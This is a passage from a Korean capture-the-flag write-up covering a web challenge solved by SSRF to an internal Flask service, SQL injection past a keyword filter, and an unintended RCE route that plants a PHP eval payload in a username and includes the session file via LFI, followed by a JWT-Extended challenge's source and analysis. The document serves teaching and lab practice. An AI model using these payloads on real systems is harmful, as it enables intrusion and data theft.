  <li><code class="highlighter-rouge">mypage</code> 에서 <code class="highlighter-rouge">http://0:2026</code> 으로 <code class="highlighter-rouge">preview</code> 를 요청하면 정상적으로 요청되는 것을 확인할 수 있다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:2026

Well done! Go to /flag
</code></pre></div></div>

<ul>
  <li>하단의 이미지를 <code class="highlighter-rouge">새 탭에서 열기</code> 등을 이용하여 데이터를 확인해보면 <code class="highlighter-rouge">localhost</code> 의 2026 포트로 돌고 있는 <code class="highlighter-rouge">웹 서비스</code> 를 확인할 수 있으며, <code class="highlighter-rouge">/flag</code> path로 이동하라는 메시지가 나타난다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:2026/flag

Usage : /flag?passcode=
/flag has a delay for 3sec.
Do not bruteforce!
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">/flag</code> path에 접근하면 <code class="highlighter-rouge">passcode</code> 를 요구한다. <code class="highlighter-rouge">mypage</code> 페이지와 동일하게 3초의 딜레이를 가지고 있는 것을 확인할 수 있다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:2026/flag?passcode=1234

Wrong passcode!
Go back to PHP... You can get the passcode in PHP
</code></pre></div></div>

<ul>
  <li>아무 <code class="highlighter-rouge">passcode</code> 를 입력하면 위와 같은 안내 메시지가 나타난다. 현재 서비스에서 <code class="highlighter-rouge">passcode</code> 를 얻을 수 있는 방법이 없기 때문에 <code class="highlighter-rouge">php</code> 서비스로 돌아가자.</li>
</ul>

<h3 id="5-sql-injection--passcode-확인">5. sql injection → passcode 확인</h3>

<p><img src="/assets/bob/bob932.png" alt="/assets/bob/bob932.png" /></p>

<ul>
  <li><code class="highlighter-rouge">articles.php</code> 페이지의 상단을 보면 검색 박스가 있는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
		  <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"search"</span><span class="p">];</span>
		  <span class="nv">$search</span> <span class="o">=</span> <span class="s2">"%${s}%"</span><span class="p">;</span>
		  
		  <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"p"</span><span class="p">];</span>
		  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$page</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$page</span><span class="p">)){</span>
		      <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		  <span class="p">}</span>
		  <span class="k">else</span><span class="p">{</span>
		      <span class="nv">$page</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
		  <span class="p">}</span>
		  <span class="nv">$page</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
		  <span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nv">$page</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		  <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$page</span><span class="o">*</span><span class="mi">10</span><span class="p">;</span>
		  
		  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(\ |</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text</span><span class="se">\"</span><span class="s2">)/i"</span><span class="p">,</span> <span class="nv">$search</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
		      <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Don\'t hack!');history.back();&lt;/script&gt;"</span><span class="p">;</span>
		      <span class="k">die</span><span class="p">();</span>
		  <span class="p">}</span>
		  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id, title, content, author, img from board where title like '${search}' or content like '${search}' order by id desc limit ${start}, 10"</span><span class="p">;</span>
		  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
		
			<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
					<span class="k">echo</span> <span class="s2">"&lt;li onclick=</span><span class="se">\"</span><span class="s2">location.href='/?page=view&amp;id=${row['id']}';</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="s2">${row['img']}</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">width: 100%; height: 20vh; object-fit: cover; </span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;div class="post-info"&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;div class="post-basic-info"&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s2">"&lt;h3&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2">&gt;${row['title']}&lt;/a&gt;&lt;/h3&gt;"</span><span class="p">;</span>
			              <span class="k">echo</span> <span class="s2">"&lt;p&gt;${row['content']}&lt;/p&gt;"</span><span class="p">;</span>
			              <span class="k">echo</span> <span class="s2">"&lt;span&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2">&gt;Writer: ${row['author']}&lt;/a&gt;&lt;/span&gt;"</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;/li&gt;'</span><span class="p">;</span>
		  <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">articles.php</code> 의 코드를 확인해보면 검색 구문에서 <code class="highlighter-rouge">sql injection</code> 취약점이 발생한다는 것을 알 수 있다.</li>
  <li>하지만 상단의 정규표현식에서 어느 정도의 공백과 <code class="highlighter-rouge">=</code>, <code class="highlighter-rouge">like</code> 등을 필터링 하고 있기 때문에 이를 적절히 우회하여 필요한 정보를 얻어내야 한다.</li>
</ul>

<p><img src="/assets/bob/bob933.png" alt="/assets/bob/bob933.png" /></p>

<ul>
  <li>공백이 필터링 되었으니 <code class="highlighter-rouge">\x0b</code> 또는 <code class="highlighter-rouge">/**/</code> 등의 주석을 이용하여 공백을 대체하고, <code class="highlighter-rouge">like</code> 와 <code class="highlighter-rouge">=</code> 가 필터링 되었으니 <code class="highlighter-rouge">in</code> 을 사용하여 비교를 해주자.</li>
  <li><code class="highlighter-rouge">sql injection</code>을 통해 해당 데이터베이스 내의 테이블 리스트를 추출하였으며, 그 중 <code class="highlighter-rouge">p4SSc0D3</code> 테이블이 존재하는 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob934.png" alt="/assets/bob/bob934.png" /></p>

<ul>
  <li><code class="highlighter-rouge">p4SSc0D3</code> 테이블의 컬럼명은 <code class="highlighter-rouge">passcode</code>인 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob935.png" alt="/assets/bob/bob935.png" /></p>

<h3 id="6-flag-확인">6. flag 확인</h3>

<ul>
  <li><code class="highlighter-rouge">passcode</code>는 <code class="highlighter-rouge">5UP3R_S3CUR3_STR0NG_P4S5C0D3</code> 인 것을 확인했으니, 이전에 확인한 웹 서비스(개)에 <code class="highlighter-rouge">passcode</code>를 입력하면 <code class="highlighter-rouge">flag</code>를 얻을 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob936.png" alt="/assets/bob/bob936.png" /></p>

<ul>
  <li>FLAG : bob{sabeon_eun_gaein_juiya}</li>
</ul>

<h3 id="7-여담-1">7. 여담 (1)</h3>

<p><img src="/assets/bob/bob937.png" alt="/assets/bob/bob937.png" /></p>

<ul>
  <li><code class="highlighter-rouge">sql injection</code>을 통해 <code class="highlighter-rouge">admin</code> 테이블과 <code class="highlighter-rouge">clue</code> 테이블이 있는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ...</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(\ |</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text</span><span class="se">\"</span><span class="s2">)/i"</span><span class="p">,</span> <span class="nv">$search</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Don\'t hack!');history.back();&lt;/script&gt;"</span><span class="p">;</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// ...</span>
</code></pre></div></div>

<ul>
  <li>하지만 대회 서비스 중 <code class="highlighter-rouge">articles.php</code> 의 필터링으로 인해 <code class="highlighter-rouge">clue</code> 와 <code class="highlighter-rouge">admin</code> 모두 접근이 불가능한 상태였다.</li>
  <li><code class="highlighter-rouge">admin</code> 테이블은 <code class="highlighter-rouge">admin 계정</code> 의 평문 패스워드를 저장해두었다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"admin"</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">/?page=readme</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;Readme&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">"&lt;li style=</span><span class="se">\"</span><span class="s2">position: absolute; left: 10rem;</span><span class="se">\"</span><span class="s2">&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">cursor: default;</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;USER : ${_SESSION['username']}&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 10rem;"&gt;&lt;a href="/?page=mypage"&gt;&lt;span&gt;Mypage&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=logout"&gt;&lt;span&gt;Logout&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=login"&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>그리고 <code class="highlighter-rouge">admin 계정</code> 으로 로그인하면 <code class="highlighter-rouge">readme.php</code> 페이지에 접근할 수 있는 메뉴가 생긴다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"admin"</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Invalid access.");history.back();&lt;/script&gt;'</span><span class="p">;</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select text from clue where 1 limit 1"</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>

    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
    <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
    
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"text"</span><span class="p">]);</span>

    
    <span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">readme.php</code> 페이지는 <code class="highlighter-rouge">clue</code> 테이블에 존재하는 힌트 메시지를 받아와 출력해주는 역할을 한다.</li>
</ul>

<p><img src="/assets/bob/bob938.png" alt="/assets/bob/bob938.png" /></p>

<ul>
  <li>대회 전 날, 잠결에 코드 수정하다 <code class="highlighter-rouge">admin</code> 문자열을 필터링에 넣는 바람에,, <code class="highlighter-rouge">admin 계정</code> 의 패스워드를 알아내지 못하게 되어 힌트 페이지가 사라지게 되었다.</li>
  <li>이를 인지했을 땐 이미 solver가 나왔기 때문에 수정할 수 없어 힌트 페이지는 없었던 것으로,,, 되었다.</li>
  <li>위 스크린샷이 이제는 들어갈 수 없어져버린 <code class="highlighter-rouge">힌트 페이지</code> 다.</li>
</ul>

<h3 id="8-여담-2--unintended-solution">8. 여담 (2) → Unintended Solution</h3>

<ul>
  <li><code class="highlighter-rouge">이진*</code>, <code class="highlighter-rouge">김경*</code> 님께서 위에 설명했던 <code class="highlighter-rouge">/home/php/.bash_history</code> 참조를 통한 풀이가 아닌 <code class="highlighter-rouge">rce</code> 로 문제를 풀이하여, 이에 대한 설명도 진행하겠다.</li>
  <li>lfi와 sqli의 과정은 동일하다.</li>
</ul>

<p><img src="/assets/bob/bob939.png" alt="/assets/bob/bob939.png" /></p>

<ul>
  <li>헤더 메뉴를 확인해보면, 로그인 시 <code class="highlighter-rouge">USER : {USERNAME}</code> 의 형태로 출력되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"admin"</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">/?page=readme</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;Readme&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">"&lt;li style=</span><span class="se">\"</span><span class="s2">position: absolute; left: 10rem;</span><span class="se">\"</span><span class="s2">&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">cursor: default;</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;USER : ${_SESSION['username']}&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 10rem;"&gt;&lt;a href="/?page=mypage"&gt;&lt;span&gt;Mypage&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=logout"&gt;&lt;span&gt;Logout&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=login"&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">header.php</code> 를 확인해보면 <code class="highlighter-rouge">$_SESSION['username']</code> 으로 세션에 저장된 username을 가져온다.</li>
  <li>username에 <code class="highlighter-rouge"><span class="cp">&lt;?=</span><span class="nx">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">)</span><span class="cp">?&gt;</span></code> 와 같은 PHP expression tag를 사용하여 eval 코드를 삽입한 후 회원가입 및 로그인한다.</li>
  <li>이후 일반적으로 세션이 저장되는 위치인 <code class="highlighter-rouge">/var/lib/php/session/</code> 디렉토리의 <code class="highlighter-rouge">sess_{PHPSESSID}</code> 파일을 lfi 취약점을 통해 include하여 <code class="highlighter-rouge">rce</code> 한다.</li>
</ul>

<p><img src="/assets/bob/bob940.png" alt="/assets/bob/bob940.png" /></p>

<p><img src="/assets/bob/bob941.png" alt="/assets/bob/bob941.png" /></p>

<p><img src="/assets/bob/bob942.png" alt="/assets/bob/bob942.png" /></p>

<ul>
  <li>위와 같이 <code class="highlighter-rouge">rce</code> 를 진행한 후, python flask 소스코드가 있는 <code class="highlighter-rouge">/app</code> 디렉토리를 찾아 해당 <code class="highlighter-rouge">/app/app.py</code> 를 읽어 포트 번호를 알아낸다.</li>
  <li>
    <p>그리고 <code class="highlighter-rouge">curl 명령어</code> 또는 <code class="highlighter-rouge">ssrf 취약점</code> 을 이용하여 <code class="highlighter-rouge">http://localhost:2026/flag</code> 페이지에 접근하여 플래그를 획득한다.</p>
  </li>
  <li>php 계정은 <code class="highlighter-rouge">/flag</code> 파일에 대한 읽기 권한이 없기 때문에 <code class="highlighter-rouge">cat /flag</code>  또는 <code class="highlighter-rouge">lfi 취약점</code> 으로는 읽을 수 없다.</li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="jwt-extended">JWT-Extended</h2>

<hr />

<p><img src="/assets/bob/bob943.png" alt="/assets/bob/bob943.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>안전하지 않은 Flask-JWT-Extended 모듈 사용

- JWT 토큰을 전송하는 방법을 여러 가지로 시도해볼 수 있다.
- 문제에서 /flag로 아무런 값을 넣지 않고 접근해보면 다음과 같은 msg를 받을 수 있다. 여기서 cookies or headers 라는 문구를 통해 토큰 값을 적절히 넣어줄 곳을 예상할 수 있다.
</code></pre></div></div>

<p><img src="/assets/bob/bob944.png" alt="/assets/bob/bob944.png" /></p>

<ul>
  <li>Cookie와 Header를 번갈아가며 만료되거나 만료되지 않은 값을 삽입한 후 전송하게 되면 풀리는 문제다.</li>
</ul>

<h3 id="문제-상세-설명">문제 상세 설명</h3>

<ul>
  <li>원래의 문제 소스는 아래와 같다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="p">(</span>
    <span class="n">Flask</span><span class="p">,</span>
    <span class="n">request</span><span class="p">,</span>
    <span class="n">jsonify</span>
<span class="p">)</span>
<span class="kn">from</span> <span class="nn">flask_jwt_extended</span> <span class="kn">import</span> <span class="p">(</span>
    <span class="n">JWTManager</span><span class="p">,</span>
    <span class="n">jwt_required</span><span class="p">,</span>
    <span class="n">create_access_token</span><span class="p">,</span>
    <span class="n">decode_token</span><span class="p">,</span>
    <span class="n">get_jwt_identity</span><span class="p">,</span>
<span class="p">)</span>

<span class="kn">from</span> <span class="nn">jwt.utils</span>      <span class="kn">import</span> <span class="n">base64url_decode</span>
<span class="kn">from</span> <span class="nn">jwt.algorithms</span> <span class="kn">import</span> <span class="n">get_default_algorithms</span>

<span class="kn">import</span> <span class="nn">datetime</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">json</span>
 

<span class="k">def</span> <span class="nf">is_expired</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">decode_token</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">allow_expired</span><span class="o">=</span><span class="bp">True</span><span class="p">)[</span><span class="s">'exp'</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()):</span>
        <span class="k">return</span> <span class="bp">True</span>   
    
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">create_app</span><span class="p">(</span><span class="n">config</span><span class="o">=</span><span class="s">"app.config.Config"</span><span class="p">):</span>
    <span class="c1"># Setup flask
</span>    <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

    <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">from_object</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>

    <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
        <span class="k">return</span> <span class="s">"POST : /login &lt;br&gt;</span><span class="se">\n</span><span class="s">GET : /flag"</span>
    
    <span class="c1"># Standard login endpoint
</span>    <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
    <span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'username'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
            <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span><span class="p">:</span><span class="s">"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""</span><span class="p">}),</span> <span class="mi">400</span>
    
        <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="s">'admin'</span> <span class="ow">or</span> <span class="n">password</span> <span class="o">!=</span> <span class="s">'admin'</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span><span class="p">:</span> <span class="s">"Bad username or password"</span><span class="p">}),</span> <span class="mi">401</span>
    
        <span class="n">access_token</span> <span class="o">=</span> <span class="n">create_access_token</span><span class="p">(</span> <span class="n">identity</span><span class="o">=</span><span class="n">username</span><span class="p">,</span>
                                            <span class="n">expires_delta</span><span class="o">=</span><span class="n">datetime</span><span class="p">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">minutes</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>

        <span class="n">ret</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">'access_token'</span><span class="p">:</span> <span class="n">access_token</span><span class="p">,</span>
        <span class="p">}</span>
    
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">ret</span><span class="p">),</span> <span class="mi">200</span>
    
    <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/flag'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
    <span class="o">@</span><span class="n">jwt_required</span>
    <span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">access_token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"Authorization"</span><span class="p">).</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span>           <span class="p">:</span> <span class="s">"No Token!"</span><span class="p">})</span>

        <span class="n">current_user</span> <span class="o">=</span> <span class="n">get_jwt_identity</span><span class="p">()</span>
        
        <span class="k">if</span> <span class="n">current_user</span> <span class="o">==</span> <span class="s">'admin'</span> <span class="ow">and</span> <span class="n">is_expired</span><span class="p">(</span><span class="n">access_token</span><span class="p">):</span>
            <span class="c1"># Here your Flag / It is not Race condition
</span>            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Good For You"</span>  <span class="p">:</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'FLAG'</span><span class="p">]})</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span>           <span class="p">:</span><span class="s">"Not Expired Token!"</span><span class="p">})</span>
    

    <span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="n">app_context</span><span class="p">():</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_SECRET_KEY'</span><span class="p">]</span>     <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET'</span><span class="p">]</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_TOKEN_LOCATION'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s">'cookies'</span><span class="p">,</span> <span class="s">'headers'</span><span class="p">]</span>
        <span class="n">jwtmanager</span>                       <span class="o">=</span> <span class="n">JWTManager</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">app</span>
</code></pre></div></div>

<ul>
  <li>위의 문제에서 요구하는 것은 /flag 로 접근하여 <strong><code class="highlighter-rouge">@jwt_required</code></strong>를 통과한 후, flag 함수를 실행하지만, <strong><code class="highlighter-rouge">get_jwt_identity()</code></strong> 함수와 <strong><code class="highlighter-rouge">is_expired()</code></strong> 함수를 통해 현재 토큰이 만료되어야만 flag를 전달해주는 형태의 문제이다.</li>
  <li>첫 번째로 jwt_required라는 decorator에서는 request에서 받아온 JWT의 상태를 체크하고, 정상적인 토큰(만료 상태, 시그니처 확인 등)인 가를 확인한다. 즉, 정상적으로 서버에서 발행한 토큰이어야 한다는 의미이다.</li>
  <li>두 번째로 access_token에서 Authorization 헤더에 있는 토큰을 받아와 해당 토큰이 정상적인지 체크하여 expired 되었는지 확인하는 루틴이 있다. 단, 여기서도 get_jwt_identity() 함수로 토큰을 검사하기 때문에 서버에서 발행한 정상적인 토큰을 사용해야 한다.</li>
  <li>따라서 위의 문제의 컨셉은 <strong>JWT가 만료되지 않았지만, 만료되어야 풀리</strong>는 문제로, 로지컬한 취약점을 의도한 것이다. 먼저 문제 풀이에 앞서 Flask-JWT-Extended 오픈소스에 대한 설명이 필요할 것 같다.</li>
</ul>

<h3 id="flask-jwt-extended">Flask-JWT-Extended</h3>

<ul>
  <li>Flask에는 다양한 Extended 모듈이 있는데, 그 중 하나로 JWT에 대한 모듈이 있다. pyjwt를 사용해도 무방하나, 보다 유연한 코드 작성과 관리를 위해 Flask-JWT-Extended를 추천한다.</li>
  <li><a href="https://flask-jwt-extended.readthedocs.io/en/stable/"><strong>Document</strong></a>를 살펴보면 Basic Usage에서 보여주는 것과 같이 <strong><code class="highlighter-rouge">Header</code></strong>를 통해 JWT를 사용하는 것과 <strong><code class="highlighter-rouge">Query(get)</code></strong>, <strong><code class="highlighter-rouge">JSON(post)</code></strong>, <strong><code class="highlighter-rouge">Cookie</code></strong>그리고 총 네 가지 방법으로 사용이 가능하다.</li>
  <li>이를 처리하는 루틴을 먼저 파악해보도록 하자.</li>
  <li>flask-jwt-extended 의 view_decorator 소스</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/vimalloc/flask-jwt-extended/blob/master/flask_jwt_extended/view_decorators.py
